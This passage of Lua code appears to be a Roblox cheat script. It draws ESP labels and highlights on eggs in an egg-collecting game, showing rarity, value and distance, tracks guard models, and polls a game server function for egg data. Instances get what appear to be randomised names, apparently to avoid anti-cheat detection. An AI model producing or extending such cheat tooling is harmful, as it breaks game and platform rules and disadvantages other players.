			screenGui.ResetOnSpawn = false
			screenGui.IgnoreGuiInset = true
			screenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
			screenGui.DisplayOrder = 48
			screenGui.Parent = v3
			return screenGui
		end

		tbl5.CreateTag = function(parent, maxDistance)
			local billboardGui = Instance.new("BillboardGui")
			billboardGui.Name = fn3()
			billboardGui.AlwaysOnTop = true
			billboardGui.LightInfluence = 0
			billboardGui.MaxDistance = maxDistance
			local frame = Instance.new("Frame")
			frame.Name = fn3()
			frame.BackgroundTransparency = 1
			frame.BorderSizePixel = 0
			frame.Size = UDim2.fromScale(1, 1)
			frame.Parent = billboardGui
			local uiListLayout = Instance.new("UIListLayout")
			uiListLayout.Name = fn3()
			uiListLayout.FillDirection = Enum.FillDirection.Vertical
			uiListLayout.HorizontalAlignment = Enum.HorizontalAlignment.Center
			uiListLayout.VerticalAlignment = Enum.VerticalAlignment.Center
			uiListLayout.SortOrder = Enum.SortOrder.LayoutOrder
			uiListLayout.Parent = frame
			billboardGui.Parent = parent
			return billboardGui, frame
		end

		tbl5.CreateTextRow = function(parent, fontFace, layoutOrder, arg)
			local frame = Instance.new("Frame")
			frame.Name = fn3()
			frame.BackgroundTransparency = 1
			frame.BorderSizePixel = 0
			frame.Size = UDim2.fromScale(1, arg)
			frame.LayoutOrder = layoutOrder
			frame.Parent = parent

			local function createTextLabel(zIndex)
				local textLabel = Instance.new("TextLabel")
				textLabel.Name = fn3()
				textLabel.BackgroundTransparency = 1
				textLabel.Size = UDim2.fromScale(1, 1)
				textLabel.Text = ""
				textLabel.TextScaled = true
				textLabel.TextStrokeTransparency = 1
				textLabel.TextXAlignment = Enum.TextXAlignment.Center
				textLabel.TextYAlignment = Enum.TextYAlignment.Center
				textLabel.ZIndex = zIndex

				if fontFace then
					textLabel.FontFace = fontFace
				else
					textLabel.Font = Enum.Font.GothamBold
				end

				textLabel.Parent = frame
				return textLabel
			end

			local v9 = createTextLabel(2)
			v9.Position = UDim2.fromOffset(1, 1)
			v9.TextColor3 = Color3.new(0, 0, 0)
			v9.TextTransparency = 0.1
			local v10 = createTextLabel(3)
			v10.TextColor3 = Color3.new(1, 1, 1)
			local uiStroke = Instance.new("UIStroke")
			uiStroke.Name = fn3()
			uiStroke.ApplyStrokeMode = Enum.ApplyStrokeMode.Contextual
			uiStroke.LineJoinMode = Enum.LineJoinMode.Round
			uiStroke.Color = Color3.new(1, 1, 1)
			uiStroke.Transparency = 0.05

			uiStroke.Thickness = pcall(function()
				uiStroke.StrokeSizingMode = Enum.StrokeSizingMode.ScaledSize
			end) and 0.05 or 1.2

			uiStroke.Parent = v10
			local uiGradient = Instance.new("UIGradient")
			uiGradient.Name = fn3()
			uiGradient.Rotation = 90
			uiGradient.Parent = uiStroke
			local uiGradient2 = Instance.new("UIGradient")
			uiGradient2.Name = fn3()
			uiGradient2.Rotation = 90
			uiGradient2.Parent = v10
			return { Holder = frame, Shadow = v9, Label = v10, StrokeGradient = uiGradient, TextGradient = uiGradient2, Palette = nil }
		end

		tbl5.SetRow = function(arg, text, palette)
			if arg.Label.Text ~= text then
				arg.Label.Text = text
				arg.Shadow.Text = text
			end

			if arg.Palette ~= palette then
				arg.Palette = palette
				arg.TextGradient.Color = palette.Text
				arg.TextGradient.Rotation = palette.Rotation or 90
				arg.StrokeGradient.Color = palette.Stroke
			end
		end

		tbl5.ReadToggle = function(arg, arg2)
			if type(arg) ~= "table" then
				return arg2 == true
			end

			local ok, result = pcall(function()
				local controller = arg._controller
				return type(controller) == "table" and type(controller.GetValue) == "function" and controller.GetValue()
			end)

			if ok and type(result) == "boolean" then
				return result
			end

			for _, v9 in ipairs({ "Get", "GetValue" }) do
				local ok2, result2 = pcall(function()
					return arg[v9]
				end)

				if ok2 and type(result2) == "function" then
					local ok3, result3 = pcall(result2, arg)
					if ok3 and type(result3) == "boolean" then
						return result3
					end
				end
			end

			return arg2 == true
		end

		tbl5.SyncSoon = function(arg)
			arg()
			task.delay(0.35, arg)
		end

		tbl5.GetGuardAreas = function()
			local world = workspace:FindFirstChild("World") or workspace:FindFirstChild("__OBJECTS")
			world = world and world:FindFirstChild("Areas")
			return world and world:FindFirstChild("GuardAreas")
		end

		tbl5.FindGuardRoot = function(arg)
			local humanoidRootPart = arg:FindFirstChild("HumanoidRootPart")
			if humanoidRootPart and humanoidRootPart:IsA("BasePart") then
				return humanoidRootPart
			end

			if arg.PrimaryPart then
				return arg.PrimaryPart
			end
			return arg:FindFirstChildWhichIsA("BasePart", true)
		end

		tbl5.WatchGuards = function(arg)
			local tbl10 = {}
			local v9 = tbl5.GetGuardAreas()
			if not v9 then
				return tbl10
			end

			local function fn9(child)
				local guard = child:FindFirstChild("Guard")

				if guard and guard:IsA("Model") then
					arg(child.Name, guard)
				end

				table.insert(tbl10, child.ChildAdded:Connect(function(child2)
					if child2.Name == "Guard" and child2:IsA("Model") then
						arg(child.Name, child2)
					end
				end))
			end

			for _, child in ipairs(v9:GetChildren()) do
				fn9(child)
			end

			table.insert(tbl10, v9.ChildAdded:Connect(fn9))
			return tbl10
		end

		tbl5.DisconnectAll = function(arg)
			for _, v9 in ipairs(arg) do
				pcall(function()
					v9:Disconnect()
				end)
			end

			table.clear(arg)
		end

		local n12
		n12 = 18
		local tbl10

		tbl10 = {
			"Icon",
			"Name",
			"Rarity",
			"Mutation",
			"Value",
			"Weight",
			"Size",
			"Sell Price",
			"Distance",
			"Area",
			"State",
		}

		local tbl11
		tbl11 = { "Icon", "Name", "Value" }
		local tbl12
		tbl12 = { "Off", "Rare Only", "All Shown" }
		local tbl13
		tbl13 = { Icon = 3.2, Name = 1.35, Rarity = 1.2, Mutation = 1, Value = 1.1, Info = 1 }
		local v9

		local function fn9()
			local ok, result = pcall(Font.new, "rbxassetid://12187365977", Enum.FontWeight.Bold, Enum.FontStyle.Normal)
			return ok and result or tbl5.StatusFont
		end

		v9 = fn9()
		local v10

		do
			local sequence2 = tbl5.Sequence
			local tbl14 = {}
			local tbl15 = { 0, Color3.fromRGB(255, 255, 255) }
			local tbl16 = { 0.2, Color3.fromRGB(206, 212, 224) }
			local tbl17 = { 0.42, Color3.fromRGB(74, 80, 94) }
			local tbl18 = { 0.58, Color3.fromRGB(42, 46, 56) }
			local tbl19 = { 0.78, Color3.fromRGB(158, 166, 182) }
			local tbl20 = { 1, Color3.fromRGB(250, 252, 255) }
			tbl14[1] = tbl15
			tbl14[2] = tbl16
			tbl14[3] = tbl17
			tbl14[4] = tbl18
			tbl14[5] = tbl19
			tbl14[6] = tbl20
			v10 = sequence2(tbl14)
		end

		local v11
		v11 = tbl5.PaletteFromColor(Color3.fromRGB(77, 255, 122))
		local tbl14
		tbl14 = {}

		do
			local sequence2 = tbl5.Sequence
			local tbl15 = {}
			local tbl16 = { 0, Color3.fromRGB(255, 255, 255) }
			local tbl17 = { 0.5, Color3.fromRGB(222, 238, 255) }
			local tbl18 = { 1, Color3.fromRGB(255, 255, 255) }
			tbl15[1] = tbl16
			tbl15[2] = tbl17
			tbl15[3] = tbl18
			tbl14.Text = sequence2(tbl15)
		end

		do
			local sequence2 = tbl5.Sequence
			local tbl15 = {}
			local tbl16 = { 0, Color3.fromRGB(8, 8, 8) }
			local tbl17 = { 1, Color3.fromRGB(8, 8, 8) }
			tbl15[1] = tbl16
			tbl15[2] = tbl17
			tbl14.Stroke = sequence2(tbl15)
		end

		tbl14.Outline = Color3.fromRGB(255, 255, 255)
		local n13
		n13 = 0.8
		local n14
		n14 = 4.5
		local n15
		n15 = 20
		local n16
		n16 = 0.002
		local tbl15
		tbl15 = { Golden = tbl5.Palettes.Gold }

		do
			local silver = {}
			local sequence2 = tbl5.Sequence
			local tbl16 = {}
			local tbl17 = { 0, Color3.fromRGB(255, 255, 255) }
			local tbl18 = { 0.45, Color3.fromRGB(214, 222, 232) }
			local tbl19 = { 1, Color3.fromRGB(150, 160, 175) }
			tbl16[1] = tbl17
			tbl16[2] = tbl18
			tbl16[3] = tbl19
			silver.Text = sequence2(tbl16)
			local sequence3 = tbl5.Sequence
			local tbl20 = {}
			local tbl21 = { 0, Color3.fromRGB(60, 66, 78) }
			local tbl22 = { 0.55, Color3.fromRGB(30, 33, 40) }
			local tbl23 = { 1, Color3.fromRGB(10, 11, 14) }
			tbl20[1] = tbl21
			tbl20[2] = tbl22
			tbl20[3] = tbl23
			silver.Stroke = sequence3(tbl20)
			silver.Outline = Color3.fromRGB(214, 222, 232)
			tbl15.Silver = silver
		end

		tbl15.Sakura = tbl5.PaletteFromColor(Color3.fromRGB(255, 158, 216))
		tbl15.GreatBloom = tbl5.PaletteFromColor(Color3.fromRGB(124, 255, 196))
		tbl15.Boss = tbl5.PaletteFromColor(Color3.fromRGB(255, 122, 122))
		tbl15.Monstrous = tbl5.PaletteFromColor(Color3.fromRGB(192, 139, 255))

		do
			local rainbow = {}
			local sequence2 = tbl5.Sequence
			local tbl16 = {}
			local tbl17 = { 0, Color3.fromRGB(255, 107, 107) }
			local tbl18 = { 0.2, Color3.fromRGB(255, 179, 107) }
			local tbl19 = { 0.4, Color3.fromRGB(255, 240, 107) }
			local tbl20 = { 0.6, Color3.fromRGB(107, 255, 138) }
			local tbl21 = { 0.8, Color3.fromRGB(107, 200, 255) }
			local tbl22 = { 1, Color3.fromRGB(185, 107, 255) }
			tbl16[1] = tbl17
			tbl16[2] = tbl18
			tbl16[3] = tbl19
			tbl16[4] = tbl20
			tbl16[5] = tbl21
			tbl16[6] = tbl22
			rainbow.Text = sequence2(tbl16)
			local sequence3 = tbl5.Sequence
			local tbl23 = {}
			local tbl24 = { 0, Color3.fromRGB(20, 20, 30) }
			local tbl25 = { 1, Color3.fromRGB(8, 8, 12) }
			tbl23[1] = tbl24
			tbl23[2] = tbl25
			rainbow.Stroke = sequence3(tbl23)
			rainbow.Outline = Color3.fromRGB(255, 255, 255)
			rainbow.Rotation = 0
			tbl15.Rainbow = rainbow
		end

		local v12
		v12 = tbl5.PaletteFromColor(Color3.fromRGB(143, 227, 255))
		local rfEggWorldAskFieldEggSnapshot
		rfEggWorldAskFieldEggSnapshot = networking:FindFirstChild("RF/EggWorld/AskFieldEggSnapshot")
		local n17
		n17 = 0
		local tbl16

		tbl16 = {
			Eggs = false,
			MinRarity = 5,
			Specific = {},
			MutationSet = {},
			AnyMutation = false,
			NoMutation = false,
			Info = {},
			Highlight = tbl12[1],
			MinValue = 0,
			HighlightMin = 6,
			MaxDistance = math.huge,
			SizeScale = 0.75,
			FixedSize = false,
			OwnBase = true,
		}

		for _, v13 in ipairs(tbl11) do
			tbl16.Info[v13] = true
		end

		local tbl17
		tbl17 = {}
		local tbl18, v13, flag, n18, n19, flag2, v14, n20, fn10
		local tbl19 = {}
		tbl18 = {}
		v13 = nil
		flag = false
		n18 = 0
		n19 = 0
		flag2 = false
		v14 = nil
		n20 = 0

		fn10 = function(arg)
			local v15 = tbl19[arg]
			if v15 then
				return v15
			end
			local directory = tbl.Assets and tbl.Assets.Directory
			local flag3 = type(directory) == "table" and directory[arg]
			local rarity = type(flag3) == "table" and type(flag3.Rarity) == "table" and flag3.Rarity or nil
			local color3 = rarity and typeof(rarity.Color) == "Color3" and rarity.Color or Color3.new(1, 1, 1)
			local v16 = tbl5.PaletteFromColor(color3)
			local rarityGradient = rarity and rarity.RarityGradient

			if rarity and typeof(rarityGradient) ~= "Instance" then
				rarityGradient = ReplicatedStorage:FindFirstChild("Assets")
				rarityGradient = rarityGradient and rarityGradient:FindFirstChild("UI")
				rarityGradient = rarityGradient and rarityGradient:FindFirstChild("RarityGradients")

				if rarityGradient then
					rarityGradient = rarityGradient:FindFirstChild(tostring(rarity._id or rarity.DisplayName or ""))
				end

				rarityGradient = rarityGradient and rarityGradient:FindFirstChild("RarityGradient") or nil
			end

			if typeof(rarityGradient) == "Instance" and rarityGradient:IsA("UIGradient") then
				v16.Text = rarityGradient.Color
				v16.Rotation = rarityGradient.Rotation
			end

			local name

			if rarity then
				name = tostring(rarity.DisplayName or rarity._id or "")
			else
				name = rarity
			end

			name = name or ""
			local rarityPalette

			if string.upper(name) ~= "SECRET" then
				rarityPalette = v16
			else
				rarityPalette = { Text = v10, Stroke = v16.Stroke, Outline = v16.Outline, Rotation = 90 }
			end

			local tbl20 = {}

			if rarity then
				rarity = tonumber(rarity.RarityNumber or rarity.Rank)
			end

			tbl20.Number = rarity or 0
			tbl20.Name = name
			tbl20.Color = color3
			tbl20.Palette = v16
			tbl20.RarityPalette = rarityPalette
			local displayName = type(flag3) == "table"

			if displayName then
				displayName = tostring(flag3.DisplayName or arg)
			end

			tbl20.DisplayName = displayName or tostring(arg)
			tbl20.Icon = type(flag3) == "table" and flag3.Icon or nil
			tbl20.EarningRate = type(flag3) == "table" and tonumber(flag3.EarningRate) or 0
			tbl19[arg] = tbl20
			return tbl20
		end

		local fn11, fn12, fn13, tbl20, fn14

		do
			local function fn15(arg)
				local areaEggSlotsClient = workspace:FindFirstChild("AreaEggSlotsClient")
				areaEggSlotsClient = areaEggSlotsClient and areaEggSlotsClient:FindFirstChild(arg)
				if areaEggSlotsClient and areaEggSlotsClient:IsA("Model") then
					local hitbox = areaEggSlotsClient:FindFirstChild("Hitbox")
					return areaEggSlotsClient, hitbox and hitbox:IsA("BasePart") and hitbox or nil
				end
				return nil, nil
			end

			local function fn16()
				if not v14 or not v14.Parent then
					v14 = tbl5.CreateRuntime()
				end
			end

			local function fn17(arg)
				local n21 = tonumber(arg) or 0
				local tbl21 = { "", "K", "M", "B", "T", "Qa", "Qi" }
				local n22 = 1

				while math.abs(n21) >= 1000 and n22 < #tbl21 do
					n21 /= 1000
					n22 += 1
				end

				return string.format(n22 == 1 and "%.0f%s" or "%.2f%s", n21, tbl21[n22])
			end

			local function fn18(arg)
				local currentCamera = workspace.CurrentCamera
				if not currentCamera then
					return tbl16.MaxDistance
				end
				return math.min(tbl16.MaxDistance, arg * currentCamera.ViewportSize.Y / 2 * n15 * math.tan(math.rad(currentCamera.FieldOfView) * 0.5))
			end

			local function fn19(arg)
				local tbl21 = {
					{ arg.IconHolder, tbl13.Icon, arg.ShowIcon },
					{ arg.NameRow.Holder, tbl13.Name, arg.ShowName },
					{ arg.RarityRow.Holder, tbl13.Rarity, arg.ShowRarity },
					{ arg.MutationRow.Holder, tbl13.Mutation, arg.ShowMutation },
					{ arg.ValueRow.Holder, tbl13.Value, arg.ShowValue },
					{ arg.ExtraRow.Holder, tbl13.Info, arg.ShowExtra },
				}

				local n21 = 0

				for _, v15 in ipairs(tbl21) do
					if v15[3] then
						n21 += v15[2]
					end
				end

				local n22 = math.max(n21, 1)

				for _, v15 in ipairs(tbl21) do
					v15[1].Visible = v15[3]
					v15[1].Size = UDim2.fromScale(1, v15[3] and v15[2] / n22 or 0)
				end

				local v15 = tbl5.ScaledWidth(120, tbl16.SizeScale)
				local height = math.max(1, math.floor(tbl5.RowHeight(tbl16.SizeScale) * n22))

				if arg.Width ~= v15 or arg.Height ~= height or arg.Fixed ~= tbl16.FixedSize then
					arg.Width = v15
					arg.Height = height
					arg.Fixed = tbl16.FixedSize

					if tbl16.FixedSize then
						local n23 = n14 * tbl16.SizeScale
						arg.Billboard.Size = UDim2.fromScale(n23, n23 * height / v15)
						arg.Billboard.MaxDistance = fn18(n23)
					else
						arg.Billboard.Size = UDim2.fromOffset(v15, height)
						arg.Billboard.MaxDistance = tbl16.MaxDistance
					end
				end
			end

			fn11 = function(arg)
				arg.Width = nil
				fn19(arg)
			end

			local function fn20()
				local v15, v16 = tbl5.CreateTag(v14, tbl16.MaxDistance)
				local frame = Instance.new("Frame")
				frame.Name = fn3()
				frame.BackgroundTransparency = 1
				frame.BorderSizePixel = 0
				frame.LayoutOrder = 0
				frame.Parent = v16
				local imageLabel = Instance.new("ImageLabel")
				imageLabel.Name = fn3()
				imageLabel.AnchorPoint = Vector2.new(0.5, 1)
				imageLabel.BackgroundTransparency = 1
				imageLabel.Position = UDim2.fromScale(0.5, 1)
				imageLabel.Size = UDim2.fromScale(1, 1)
				imageLabel.ScaleType = Enum.ScaleType.Fit
				imageLabel.Parent = frame
				local uiAspectRatioConstraint = Instance.new("UIAspectRatioConstraint")
				uiAspectRatioConstraint.Name = fn3()
				uiAspectRatioConstraint.AspectRatio = 1
				uiAspectRatioConstraint.DominantAxis = Enum.DominantAxis.Height
				uiAspectRatioConstraint.Parent = imageLabel

				local tbl21 = {
					Billboard = v15,
					IconHolder = frame,
					Icon = imageLabel,
					NameRow = tbl5.CreateTextRow(v16, tbl5.MainFont, 1, 0.4),
					RarityRow = tbl5.CreateTextRow(v16, v9, 2, 0.2),
					MutationRow = tbl5.CreateTextRow(v16, tbl5.MainFont, 3, 0.2),
					ValueRow = tbl5.CreateTextRow(v16, tbl5.MainFont, 4, 0.2),
					ExtraRow = tbl5.CreateTextRow(v16, tbl5.MainFont, 5, 0.2),
					Highlight = nil,
					Anchor = nil,
					CFrame = nil,
					Width = nil,
					Height = nil,
					ShowIcon = false,
					ShowName = true,
					ShowRarity = false,
					ShowMutation = false,
					ShowValue = false,
					ShowExtra = false,
				}

				fn19(tbl21)
				return tbl21
			end

			local function fn21(arg)
				if arg.Highlight then
					arg.Highlight:Destroy()
					arg.Highlight = nil
					n20 -= 1
				end
			end

			local function fn22(arg, arg2)
				local n21 = tonumber(arg.AssetScale) or 1
				local n22 = n21 > 5 and (n21 / 5) ^ 1.2 * 19.637875755794113 or n21 ^ 1.85
				local mutations = tbl.Mutations
				local flag3 = type(mutations) == "table" and type(mutations.EarningsFor) == "function"
				local n23 = 1

				if flag3 then
					local ok
					ok, n23 = pcall(mutations.EarningsFor, type(arg.Mutations) == "table" and arg.Mutations or {})
					ok = ok and type(n23) == "number"
					local n24 = 1

					if not ok then
						n23 = n24
					end
				end

				return arg2.EarningRate * n22 * n23
			end

			local function fn23()
				local tbl21 = {}
				local eggState = tbl.EggState
				local placedEggRenders = workspace:FindFirstChild("PlacedEggRenders")
				if not placedEggRenders or type(eggState) ~= "table" or type(eggState.ReadOwnerEggs) ~= "function" then
					return tbl21
				end
				local ok, result = pcall(eggState.ReadOwnerEggs, localPlayer.UserId)
				if not ok or type(result) ~= "table" then
					return tbl21
				end
				local str = tostring(localPlayer.UserId)
				local tbl22 = {}

				for _, child in ipairs(placedEggRenders:GetChildren()) do
					if string.find(child.Name, str, 1, true) then
						tbl22[#tbl22 + 1] = child
					end
				end

				for k, v15 in pairs(result) do
					if type(v15) == "table" and v15.Placement ~= nil and type(v15.AssetCategory) == "string" then
						local base = tostring(k)
						local v16 = nil

						for _, v17 in ipairs(tbl22) do
							if v17.Name == base or string.find(v17.Name, base, 1, true) or v17:GetAttribute("Uid") == base then
								v16 = v17
								break
							end
						end

						if v16 then
							local ok2, result2 = pcall(function()
								return v16:IsA("Model") and v16:GetPivot() or v16.CFrame
							end)

							local mutations = type(v15.Mutations) == "table" and v15.Mutations or {}

							tbl21[#tbl21 + 1] = {
								Uid = "base:" .. base,
								AssetCategory = v15.AssetCategory,
								AssetScale = v15.AssetScale,
								Mutations = mutations,
								BaseMutation = v15.BaseMutation or mutations[1],
								State = "Base",
								AreaId = "Your Base",
								BottomCFrame = ok2 and result2 or nil,
								Model = v16,
							}
						end
					end
				end

				return tbl21
			end

			local function fn24(arg, arg2)
				if arg.State == "Claimed" then
					return false
				end

				if tbl16.MinRarity > 0 and arg2.Number < tbl16.MinRarity then
					return false
				end
				local flag3 = tbl16.MinValue > 0
				local flag4

				if flag3 then
					local minValue = tbl16.MinValue
					flag4 = fn22(arg, arg2) < minValue
				else
					flag4 = flag3
				end

				if flag4 then
					return false
				end
				return true
			end

			local function fn25(arg, arg2, arg3)
				local model, isBasePart

				if typeof(arg2.Model) == "Instance" then
					model = arg2.Model
					local hitbox = model:FindFirstChild("Hitbox", true) or model:FindFirstChildWhichIsA("BasePart", true)
					isBasePart = hitbox and hitbox:IsA("BasePart") and hitbox or nil
				else
					model, isBasePart = fn15(arg2.Uid)
				end

				local bottomCFrame = arg2.BottomCFrame

				if typeof(bottomCFrame) == "CFrame" then
					local terrain = isBasePart or workspace.Terrain

					if arg.Anchor ~= terrain or arg.CFrame ~= bottomCFrame then
						arg.Anchor = terrain
						arg.CFrame = bottomCFrame
						arg.Billboard.Adornee = terrain
						arg.Billboard.StudsOffsetWorldSpace = bottomCFrame.Position - terrain.Position + Vector3.new(0, (isBasePart and isBasePart.Position.Y - bottomCFrame.Position.Y or 1) + n13, 0)
					end
				end

				local info = tbl16.Info
				local baseMutation = arg2.BaseMutation
				local showMutation = type(baseMutation) == "string" and baseMutation ~= ""
				local n21 = tonumber(arg2.AssetScale) or 1
				local showIcon = info.Icon == true and arg3.Icon ~= nil

				if showIcon and arg.Icon.Image ~= tostring(arg3.Icon) then
					arg.Icon.Image = tostring(arg3.Icon)
				end

				local showName = info.Name == true

				if showName then
					tbl5.SetRow(arg.NameRow, arg3.DisplayName, tbl14)
				end

				local showRarity = info.Rarity == true and arg3.Name ~= ""

				if showRarity then
					local rarityPalette = arg3.RarityPalette
					tbl5.SetRow(arg.RarityRow, string.upper(arg3.Name), rarityPalette)
				end

				showMutation = info.Mutation == true and showMutation

				if showMutation then
					tbl5.SetRow(arg.MutationRow, string.upper(fn7(baseMutation)), tbl15[baseMutation] or v12)
				end

				local showValue = info.Value == true

				if showValue then
					tbl5.SetRow(arg.ValueRow, "$" .. fn17(fn22(arg2, arg3)) .. "/s", v11)
				end

				local tbl21 = {}
				local eggRecords = tbl.EggRecords

				if info.Weight and type(eggRecords) == "table" and type(eggRecords.WeightKgForScale) == "function" then
					local ok, result = pcall(eggRecords.WeightKgForScale, arg2.AssetCategory, n21)

					if ok and tonumber(result) then
						table.insert(tbl21, fn17(result) .. " kg")
					end
				end

				if info.Size then
					table.insert(tbl21, string.format("x%.2f", n21))
				end

				if info["Sell Price"] and type(eggRecords) == "table" and type(eggRecords.SellPrice) == "function" then
					local ok, result = pcall(eggRecords.SellPrice, arg2)

					if ok and tonumber(result) then
						table.insert(tbl21, "$" .. fn17(result))
					end
				end

				if info.Distance and typeof(bottomCFrame) == "CFrame" then
					local character = localPlayer.Character
					local humanoidRootPart = character and character:FindFirstChild("HumanoidRootPart")

					if humanoidRootPart then
						table.insert(tbl21, string.format("%dm", math.floor((humanoidRootPart.Position - bottomCFrame.Position).Magnitude + 0.5)))
					end
				end

				if info.Area and arg2.AreaId ~= nil then
					table.insert(tbl21, tostring(arg2.AreaId))
				end

				if info.State and arg2.State ~= nil and arg2.State ~= "Slot" then
					table.insert(tbl21, tostring(arg2.State))
				end

				local showExtra = #tbl21 > 0

				if showExtra then
					tbl5.SetRow(arg.ExtraRow, table.concat(tbl21, "  |  "), tbl5.Palettes.Sheen)
				end

				if arg.ShowIcon ~= showIcon or arg.ShowName ~= showName or arg.ShowRarity ~= showRarity or arg.ShowMutation ~= showMutation or arg.ShowValue ~= showValue or arg.ShowExtra ~= showExtra then
					arg.ShowIcon = showIcon
					arg.ShowName = showName
					arg.ShowRarity = showRarity
					arg.ShowMutation = showMutation
					arg.ShowValue = showValue
					arg.ShowExtra = showExtra
					fn19(arg)
				end

				if (tbl16.Highlight == tbl12[3] or tbl16.Highlight == tbl12[2] and arg3.Number >= tbl16.HighlightMin) and model then
					if not arg.Highlight and n20 < n12 then
						local highlight = Instance.new("Highlight")
						highlight.Name = fn3()
						highlight.DepthMode = Enum.HighlightDepthMode.AlwaysOnTop
						highlight.FillTransparency = 0.82
						highlight.OutlineTransparency = 0.05
						highlight.FillColor = arg3.Color
						highlight.OutlineColor = arg3.Palette.Outline
						highlight.Parent = v14
						arg.Highlight = highlight
						n20 += 1
					end

					if arg.Highlight and arg.Highlight.Adornee ~= model then
						arg.Highlight.Adornee = model
					end
				else
					fn21(arg)
				end
			end

			local function fn26(arg)
				fn21(arg)
				arg.Billboard:Destroy()
			end

			local function fn27()
				local v15 = tbl17
				local v16 = v14
				tbl17 = {}
				v14 = nil
				n20 = 0

				task.spawn(function()
					local now = os.clock()

					for _, v17 in pairs(v15) do
						if v17.Highlight then
							v17.Highlight:Destroy()
						end

						v17.Billboard:Destroy()

						if n16 < os.clock() - now then
							RunService.Heartbeat:Wait()
							now = os.clock()
						end
					end

					if v16 then
						v16:Destroy()
					end
				end)
			end

			local function fn28(arg, arg2, arg3)
				local function fn29()
					return arg2 == n19 and arg3 == n18 and flag
				end

				fn16()
				local tbl21 = {}
				local now = os.clock()

				for _, v15 in pairs(arg) do
					local uid = type(v15) == "table" and v15.Uid

					if type(uid) == "string" and type(v15.AssetCategory) == "string" then
						local v16 = fn10(v15.AssetCategory)

						if tbl16.Eggs and fn24(v15, v16) then
							tbl21[uid] = true
							local v17 = tbl17[uid]

							if not v17 then
								v17 = fn20()
								tbl17[uid] = v17
							end

							fn25(v17, v15, v16)
						end
					end

					if not (n16 < os.clock() - now) then
						continue
					end
					RunService.Heartbeat:Wait()
					now = os.clock()
					if not fn29() then
						return
					end
				end

				if tbl16.Eggs and tbl16.OwnBase then
					for _, v15 in ipairs(fn23()) do
						local v16 = fn10(v15.AssetCategory)

						if fn24(v15, v16) then
							tbl21[v15.Uid] = true
							local v17 = tbl17[v15.Uid]

							if not v17 then
								v17 = fn20()
								tbl17[v15.Uid] = v17
							end

							fn25(v17, v15, v16)
						end
					end
				end

				for k, v15 in pairs(tbl17) do
					if not tbl21[k] then
						tbl17[k] = nil
						fn26(v15)
					end
				end

				return true
			end

			local flag3 = false
			local flag4 = false

			fn12 = function()
				if not flag or not v13 then
					return
				end
				flag3 = true
				if flag4 then
					return
				end
				flag4 = true

				task.defer(function()
					while flag and v13 and flag3 do
						flag3 = false
						n19 += 1
						local ok, result = pcall(fn28, v13, n19, n18)

						if ok and result ~= true then
							flag3 = true
						end

						RunService.Heartbeat:Wait()
					end

					flag4 = false
				end)
			end

			local function fn29()
				local v15 = n18

				if v13 and next(tbl17) == nil then
					fn12()
				end

				local eggState = tbl.EggState
				local flag5 = type(eggState) == "table" and type(eggState.ReadFieldEggs) == "function"
				local records = nil

				if flag5 then
					local ok, result = pcall(eggState.ReadFieldEggs)
					ok = ok and type(result) == "table" and type(result.Records) == "table"
					records = nil

					if ok then
						records = result.Records
					end
				end

				if records == nil and rfEggWorldAskFieldEggSnapshot and os.clock() >= n17 then
					n17 = os.clock() + 30
					local ok, result = pcall(rfEggWorldAskFieldEggSnapshot.InvokeServer, rfEggWorldAskFieldEggSnapshot)

					if ok and type(result) == "table" and type(result.Records) == "table" then
						records = result.Records
					end
				end

				if v15 ~= n18 or not flag then
					return
				end

				if records ~= nil then
					local tbl21 = {}

					for k, record in pairs(records) do
						tbl21[k] = record
					end

					v13 = tbl21
				end

				if v13 then
					fn12()
				end
			end

			local function fn30()
				task.spawn(pcall, fn29)
			end

			local function fn31()
				if flag2 then
					return
				end
				flag2 = true

				task.delay(0.5, function()
					flag2 = false

					if flag then
						fn30()
					end
				end)
			end

			fn13 = function()
				for _, v15 in pairs(tbl17) do
					fn11(v15)
				end
			end

			local function fn32()
				flag = false
				n18 += 1
				n19 += 1
				tbl5.DisconnectAll(tbl18)
				fn27()
			end

			local function fn33()
				if flag then
					fn30()
					return
				end
				flag = true
				local v15 = n18
				local eggState = tbl.EggState

				if type(eggState) == "table" then
					for _, v16 in ipairs({ "FieldRefreshed", "FieldShifted", "FieldGone", "FieldClaimed", "SnapshotRefreshed" }) do
						local v17 = eggState[v16]

						if type(v17) == "table" and type(v17.Connect) == "function" then
							local ok, result = pcall(v17.Connect, v17, fn31)

							if ok and result then
								table.insert(tbl18, result)
							end
						end
					end
				end

				for _, v16 in ipairs({ "AreaEggSlotsClient", "PlacedEggRenders" }) do
					local v17 = workspace:FindFirstChild(v16)

					if v17 then
						table.insert(tbl18, v17.ChildAdded:Connect(fn31))
						table.insert(tbl18, v17.ChildRemoved:Connect(fn31))
					end
				end

				task.spawn(function()
					while v15 == n18 do
						task.wait(10)
						if v15 == n18 then
							fn31()
							continue
						end
						break
					end
				end)

				task.spawn(function()
					while v15 == n18 do
						task.wait(1)

						if v15 == n18 then
							if tbl16.Info.Distance then
								fn12()
							end

							continue
						end

						break
					end
				end)

				fn30()
			end

			local function fn34()
				if tbl16.Eggs then
					fn33()
				else
					fn32()
				end
			end

			tbl20 = { Eggs = nil }
			local tbl21 = { Eggs = false }
			local flag5 = false

			local function fn35()
				if flag5 then
					return
				end
				local v15 = tbl5.ReadToggle(tbl20.Eggs, tbl21.Eggs)
				if v15 == tbl16.Eggs and flag == v15 then
					return
				end
				tbl16.Eggs = v15
				fn34()
			end

			fn4(function()
				flag5 = true
				tbl16.Eggs = false
				fn32()
			end)

			fn14 = function(arg)
				local tbl22 = {}

				if type(arg) == "table" then
					for k, v15 in pairs(arg) do
						k = v15 == true and type(k) == "string" and k or type(v15) == "string" and v15
						local v16 = k or nil

						if v16 then
							tbl22[v16] = true
						end
					end
				end

				return tbl22
			end

			tbl20.Eggs = espSection:CreateToggle({
				Name = "ESP Eggs",
				Default = false,
				Callback = function(arg)
					tbl21.Eggs = arg == true
					tbl5.SyncSoon(fn35)
				end,
			})
		end

		espSection:CreateToggle({
			Name = "ESP Fixed Size",
			Default = false,
			SubOf = tbl20.Eggs,
			Callback = function(arg)
				local fixedSize = arg == true

				if tbl16.FixedSize ~= fixedSize then
					tbl16.FixedSize = fixedSize
					fn13()
				end
			end,
		})

		espSection:CreateToggle({
			Name = "ESP Own Base Eggs",
			Note = "Also show the eggs placed in your own base",
			Default = true,
			SubOf = tbl20.Eggs,
			Callback = function(arg)
				tbl16.OwnBase = arg ~= false
				fn12()
			end,
		})

		do
			local tbl21 = { "Any" }
			local tbl22 = { Any = 0 }
			local tbl23 = {}
			local tbl24 = {}
